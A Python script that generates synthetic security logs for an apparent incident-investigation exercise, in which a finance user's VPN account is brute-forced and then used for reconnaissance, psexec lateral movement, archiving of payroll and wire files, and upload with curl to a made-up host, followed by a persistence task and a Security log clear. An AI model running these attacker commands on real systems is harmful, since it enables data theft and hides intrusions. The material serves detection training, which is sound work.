#!/usr/bin/env python3
"""Write the Night Shift sample case: fragmented logs with one coherent incident."""

from __future__ import annotations

import json
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1] / "data" / "cases" / "night-shift" / "sources"


def dump(name: str, rows: list[dict]) -> None:
    path = ROOT / name
    path.parent.mkdir(parents=True, exist_ok=True)
    with path.open("w", encoding="utf-8") as fh:
        for row in rows:
            fh.write(json.dumps(row, ensure_ascii=False) + "\n")


def ev(**kwargs) -> dict:
    kwargs.setdefault("result", "success")
    kwargs.setdefault("details", {})
    return kwargs


def main() -> None:
    identity = [
        ev(
            id="id-001",
            ts="2026-10-01T00:00:00Z",
            source="identity",
            action="user_profile",
            user="jmartinez",
            host="LAPTOP-JM-14",
            object="Finance analyst",
            details={
                "display_name": "Jordan Martinez",
                "department": "Finance",
                "title": "Senior analyst",
                "usual_hours": "13:00-21:00Z",
                "usual_networks": ["10.20.8.0/24", "10.40.2.0/24"],
                "manager": "priya.nair",
                "city": "New York",
            },
        ),
        ev(
            id="id-002",
            ts="2026-10-01T00:00:00Z",
            source="identity",
            action="user_profile",
            user="jpatel",
            host="LAPTOP-JP-07",
            object="IT operations",
            details={
                "display_name": "Jay Patel",
                "department": "IT",
                "title": "Endpoint engineer",
                "usual_hours": "12:00-21:00Z",
                "usual_networks": ["10.20.8.0/24"],
                "city": "New York",
            },
        ),
        ev(
            id="id-003",
            ts="2026-10-01T00:00:00Z",
            source="identity",
            action="asset_profile",
            host="FILE-SRV-02",
            object="Finance file share",
            details={"shares": ["\\\\FILE-SRV-02\\finance", "\\\\FILE-SRV-02\\archive"]},
        ),
        ev(
            id="id-004",
            ts="2026-10-01T00:00:00Z",
            source="identity",
            action="asset_profile",
            host="VPN-GW",
            object="Corporate VPN",
            details={"vendor": "pulse"},
        ),
    ]

    auth = [
        ev(id="auth-001", ts="2026-10-14T13:04:11Z", source="auth", host="VPN-GW", user="jmartinez", action="vpn_login", src_ip="10.20.8.41"),
        ev(id="auth-002", ts="2026-10-14T13:05:02Z", source="auth", host="DC-01", user="jmartinez", action="kerberos_tgt", src_ip="10.20.8.41"),
        ev(id="auth-003", ts="2026-10-14T14:22:40Z", source="auth", host="VPN-GW", user="jpatel", action="vpn_login", src_ip="10.20.8.18"),
        ev(id="auth-004", ts="2026-10-14T16:11:09Z", source="auth", host="DC-01", user="jmartinez", action="file_share_auth", src_ip="10.20.8.41", object="\\\\FILE-SRV-02\\finance"),
        ev(id="auth-005", ts="2026-10-14T20:58:33Z", source="auth", host="VPN-GW", user="jmartinez", action="vpn_logout", src_ip="10.20.8.41"),
        ev(id="auth-006", ts="2026-10-14T21:10:01Z", source="auth", host="VPN-GW", user="jpatel", action="vpn_logout", src_ip="10.20.8.18"),
        ev(id="auth-007", ts="2026-10-14T23:40:12Z", source="auth", host="DC-01", user="svc.backup", action="service_login", src_ip="10.30.1.9", host_override=None),
        ev(id="auth-008", ts="2026-10-15T02:11:04Z", source="auth", host="VPN-GW", user="jmartinez", action="vpn_login", src_ip="185.220.101.47", result="failure", details={"reason": "bad_password"}),
        ev(id="auth-009", ts="2026-10-15T02:11:19Z", source="auth", host="VPN-GW", user="jmartinez", action="vpn_login", src_ip="185.220.101.47", result="failure", details={"reason": "bad_password"}),
        ev(id="auth-010", ts="2026-10-15T02:11:33Z", source="auth", host="VPN-GW", user="jmartinez", action="vpn_login", src_ip="185.220.101.47", result="failure", details={"reason": "bad_password"}),
        ev(id="auth-011", ts="2026-10-15T02:11:48Z", source="auth", host="VPN-GW", user="jmartinez", action="vpn_login", src_ip="185.220.101.47", result="failure", details={"reason": "bad_password"}),
        ev(id="auth-012", ts="2026-10-15T02:12:07Z", source="auth", host="VPN-GW", user="jmartinez", action="vpn_login", src_ip="185.220.101.47", result="failure", details={"reason": "bad_password"}),
        ev(id="auth-013", ts="2026-10-15T02:12:22Z", source="auth", host="VPN-GW", user="jmartinez", action="vpn_login", src_ip="185.220.101.47", result="failure", details={"reason": "bad_password"}),
        ev(id="auth-014", ts="2026-10-15T02:14:08Z", source="auth", host="VPN-GW", user="jmartinez", action="vpn_login", src_ip="185.220.101.47"),
        ev(id="auth-015", ts="2026-10-15T02:14:41Z", source="auth", host="DC-01", user="jmartinez", action="kerberos_tgt", src_ip="10.40.2.77", details={"note": "VPN-assigned address"}),
        ev(id="auth-016", ts="2026-10-15T02:16:02Z", source="auth", host="DC-01", user="jmartinez", action="rdp_logon", src_ip="10.40.2.77", object="LAPTOP-JM-14"),
        ev(id="auth-017", ts="2026-10-15T02:28:19Z", source="auth", host="DC-01", user="jmartinez", action="file_share_auth", src_ip="10.40.2.77", object="\\\\FILE-SRV-02\\finance"),
        ev(id="auth-018", ts="2026-10-15T02:41:55Z", source="auth", host="DC-01", user="jmartinez", action="file_share_auth", src_ip="10.40.2.77", object="\\\\FILE-SRV-02\\C$"),
        ev(id="auth-019", ts="2026-10-15T03:12:44Z", source="auth", host="VPN-GW", user="jmartinez", action="vpn_logout", src_ip="185.220.101.47"),
        ev(id="auth-020", ts="2026-10-15T03:40:00Z", source="auth", host="DC-01", user="svc.backup", action="service_login", src_ip="10.30.1.9"),
    ]
    for row in auth:
        row.pop("host_override", None)

    process = [
        ev(id="proc-001", ts="2026-10-14T13:12:08Z", source="process", host="LAPTOP-JM-14", user="jmartinez", action="process_create", process="excel.exe", parent_process="explorer.exe", pid=4412, ppid=1204, command_line="excel.exe Q3_forecast.xlsx"),
        ev(id="proc-002", ts="2026-10-14T14:40:22Z", source="process", host="LAPTOP-JP-07", user="jpatel", action="process_create", process="msiexec.exe", parent_process="services.exe", pid=882, ppid=712, command_line="msiexec /i CrowdStrike.msi"),
        ev(id="proc-003", ts="2026-10-14T18:02:11Z", source="process", host="LAPTOP-JM-14", user="jmartinez", action="process_create", process="outlook.exe", parent_process="explorer.exe", pid=5100, ppid=1204, command_line="outlook.exe"),
        ev(id="proc-010", ts="2026-10-15T02:16:18Z", source="process", host="LAPTOP-JM-14", user="jmartinez", action="process_create", process="winlogon.exe", parent_process="smss.exe", pid=620, ppid=480, command_line="winlogon.exe"),
        ev(id="proc-011", ts="2026-10-15T02:17:03Z", source="process", host="LAPTOP-JM-14", user="jmartinez", action="process_create", process="powershell.exe", parent_process="explorer.exe", pid=7044, ppid=1204, command_line="powershell.exe -NoP -NonI -W Hidden -Enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQA"),
        ev(id="proc-012", ts="2026-10-15T02:17:44Z", source="process", host="LAPTOP-JM-14", user="jmartinez", action="process_create", process="whoami.exe", parent_process="powershell.exe", pid=7102, ppid=7044, command_line="whoami /all"),
        ev(id="proc-013", ts="2026-10-15T02:18:02Z", source="process", host="LAPTOP-JM-14", user="jmartinez", action="process_create", process="net.exe", parent_process="powershell.exe", pid=7110, ppid=7044, command_line="net group \"Domain Admins\" /domain"),
        ev(id="proc-014", ts="2026-10-15T02:18:21Z", source="process", host="LAPTOP-JM-14", user="jmartinez", action="process_create", process="nltest.exe", parent_process="powershell.exe", pid=7118, ppid=7044, command_line="nltest /dclist:northline.local"),
        ev(id="proc-015", ts="2026-10-15T02:19:09Z", source="process", host="LAPTOP-JM-14", user="jmartinez", action="process_create", process="cmd.exe", parent_process="powershell.exe", pid=7201, ppid=7044, command_line="cmd.exe /c ipconfig /all"),
        ev(id="proc-016", ts="2026-10-15T02:26:40Z", source="process", host="LAPTOP-JM-14", user="jmartinez", action="process_create", process="net.exe", parent_process="powershell.exe", pid=7330, ppid=7044, command_line="net use \\\\FILE-SRV-02\\finance"),
        ev(id="proc-017", ts="2026-10-15T02:41:12Z", source="process", host="LAPTOP-JM-14", user="jmartinez", action="process_create", process="psexec.exe", parent_process="powershell.exe", pid=7408, ppid=7044, command_line="psexec.exe \\\\FILE-SRV-02 -accepteula cmd /c whoami"),
        ev(id="proc-018", ts="2026-10-15T02:42:01Z", source="process", host="FILE-SRV-02", user="jmartinez", action="process_create", process="psexesvc.exe", parent_process="services.exe", pid=3012, ppid=668, command_line="PSEXESVC.exe"),
        ev(id="proc-019", ts="2026-10-15T02:48:33Z", source="process", host="LAPTOP-JM-14", user="jmartinez", action="process_create", process="7z.exe", parent_process="powershell.exe", pid=7511, ppid=7044, command_line="7z.exe a C:\\Users\\Public\\tmp\\export.7z \\\\FILE-SRV-02\\finance\\payroll \\\\FILE-SRV-02\\finance\\wire_templates"),
        ev(id="proc-020", ts="2026-10-15T02:55:18Z", source="process", host="LAPTOP-JM-14", user="jmartinez", action="process_create", process="curl.exe", parent_process="powershell.exe", pid=7602, ppid=7044, command_line="curl.exe -F file=@C:\\Users\\Public\\tmp\\export.7z https://files.lumen-drop.net/upload"),
        ev(id="proc-021", ts="2026-10-15T03:01:44Z", source="process", host="LAPTOP-JM-14", user="jmartinez", action="process_create", process="schtasks.exe", parent_process="powershell.exe", pid=7704, ppid=7044, command_line="schtasks.exe /Create /TN Updater /TR \"powershell.exe -Enc JABhAD0AMQAyADMA\" /SC ONLOGON /F"),
        ev(id="proc-022", ts="2026-10-15T03:08:02Z", source="process", host="LAPTOP-JM-14", user="jmartinez", action="process_create", process="wevtutil.exe", parent_process="powershell.exe", pid=7810, ppid=7044, command_line="wevtutil.exe cl Security"),
    ]

    files = [
        ev(id="file-001", ts="2026-10-14T16:11:14Z", source="file", host="FILE-SRV-02", user="jmartinez", action="file_read", object="\\\\FILE-SRV-02\\finance\\Q3_forecast.xlsx", src_ip="10.20.8.41"),
        ev(id="file-002", ts="2026-10-14T16:40:02Z", source="file", host="FILE-SRV-02", user="jmartinez", action="file_read", object="\\\\FILE-SRV-02\\finance\\vendor_list.xlsx", src_ip="10.20.8.41"),
        ev(id="file-003", ts="2026-10-14T23:41:00Z", source="file", host="FILE-SRV-02", user="svc.backup", action="file_read", object="\\\\FILE-SRV-02\\archive\\incr.bak"),
        ev(id="file-010", ts="2026-10-15T02:28:22Z", source="file", host="FILE-SRV-02", user="jmartinez", action="file_read", object="\\\\FILE-SRV-02\\finance\\payroll\\2026_Q3_payroll.xlsx", src_ip="10.40.2.77"),
        ev(id="file-011", ts="2026-10-15T02:28:40Z", source="file", host="FILE-SRV-02", user="jmartinez", action="file_read", object="\\\\FILE-SRV-02\\finance\\payroll\\ssn_export.csv", src_ip="10.40.2.77"),
        ev(id="file-012", ts="2026-10-15T02:29:05Z", source="file", host="FILE-SRV-02", user="jmartinez", action="file_read", object="\\\\FILE-SRV-02\\finance\\wire_templates\\swift_batch.csv", src_ip="10.40.2.77"),
        ev(id="file-013", ts="2026-10-15T02:29:33Z", source="file", host="FILE-SRV-02", user="jmartinez", action="file_read", object="\\\\FILE-SRV-02\\finance\\M&A\\northline_target_model.xlsx", src_ip="10.40.2.77"),
        ev(id="file-014", ts="2026-10-15T02:42:18Z", source="file", host="FILE-SRV-02", user="jmartinez", action="admin_share_access", object="\\\\FILE-SRV-02\\C$\\Windows\\Temp", src_ip="10.40.2.77"),
        ev(id="file-015", ts="2026-10-15T02:48:40Z", source="file", host="LAPTOP-JM-14", user="jmartinez", action="file_create", object="C:\\Users\\Public\\tmp\\export.7z", details={"size_mb": 86}),
        ev(id="file-016", ts="2026-10-15T02:55:20Z", source="file", host="LAPTOP-JM-14", user="jmartinez", action="file_read", object="C:\\Users\\Public\\tmp\\export.7z"),
        ev(id="file-017", ts="2026-10-15T03:08:09Z", source="file", host="LAPTOP-JM-14", user="jmartinez", action="log_clear", object="Security.evtx"),
    ]

    network = [
        ev(id="net-001", ts="2026-10-14T13:20:11Z", source="network", host="LAPTOP-JM-14", user="jmartinez", action="https", dst_ip="52.96.20.14", dst_port=443, object="outlook.office365.com", bytes_out=240000, src_ip="10.20.8.41"),
        ev(id="net-002", ts="2026-10-14T15:02:44Z", source="network", host="LAPTOP-JM-14", user="jmartinez", action="https", dst_ip="13.107.42.12", dst_port=443, object="sharepoint.com", bytes_out=18000, src_ip="10.20.8.41"),
        ev(id="net-003", ts="2026-10-14T19:11:02Z", source="network", host="LAPTOP-JP-07", user="jpatel", action="https", dst_ip="44.238.11.9", dst_port=443, object="windows-update", bytes_out=900000),
        ev(id="net-010", ts="2026-10-15T02:17:08Z", source="network", host="LAPTOP-JM-14", user="jmartinez", action="https", dst_ip="45.9.148.88", dst_port=443, object="cdn.lumen-drop.net", bytes_out=4200, src_ip="10.40.2.77", details={"first_seen": True, "ja3": "rare"}),
        ev(id="net-011", ts="2026-10-15T02:17:40Z", source="network", host="LAPTOP-JM-14", user="jmartinez", action="https", dst_ip="45.9.148.88", dst_port=443, object="cdn.lumen-drop.net", bytes_out=1800, src_ip="10.40.2.77"),
        ev(id="net-012", ts="2026-10-15T02:18:11Z", source="network", host="LAPTOP-JM-14", user="jmartinez", action="https", dst_ip="45.9.148.88", dst_port=443, object="cdn.lumen-drop.net", bytes_out=1900, src_ip="10.40.2.77"),
        ev(id="net-013", ts="2026-10-15T02:26:55Z", source="network", host="LAPTOP-JM-14", user="jmartinez", action="smb", dst_ip="10.30.4.12", dst_port=445, object="FILE-SRV-02", bytes_out=12000, src_ip="10.40.2.77"),
        ev(id="net-014", ts="2026-10-15T02:41:20Z", source="network", host="LAPTOP-JM-14", user="jmartinez", action="smb", dst_ip="10.30.4.12", dst_port=445, object="FILE-SRV-02 admin$", bytes_out=88000, src_ip="10.40.2.77"),
        ev(id="net-015", ts="2026-10-15T02:55:22Z", source="network", host="LAPTOP-JM-14", user="jmartinez", action="https", dst_ip="45.9.148.88", dst_port=443, object="files.lumen-drop.net", bytes_out=90123211, src_ip="10.40.2.77", details={"method": "POST"}),
        ev(id="net-016", ts="2026-10-15T03:00:01Z", source="network", host="LAPTOP-JM-14", user="jmartinez", action="dns", dst_ip="10.20.0.53", dst_port=53, object="lumen-drop.net", src_ip="10.40.2.77"),
    ]

    dump("identity.jsonl", identity)
    dump("auth.jsonl", auth)
    dump("process.jsonl", process)
    dump("file.jsonl", files)
    dump("network.jsonl", network)
    print(f"wrote {sum(len(x) for x in (identity, auth, process, files, network))} events")


if __name__ == "__main__":
    main()
